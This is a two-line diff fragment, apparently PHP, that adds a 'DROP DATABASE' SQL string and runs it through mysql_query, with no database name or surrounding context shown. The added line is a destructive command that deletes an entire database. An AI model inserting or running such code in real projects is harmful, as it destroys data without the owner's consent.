@@ -1,0 +1,2 @@
+$_SQL = "DROP DATABASE ";
+mysql_query($_SQL);
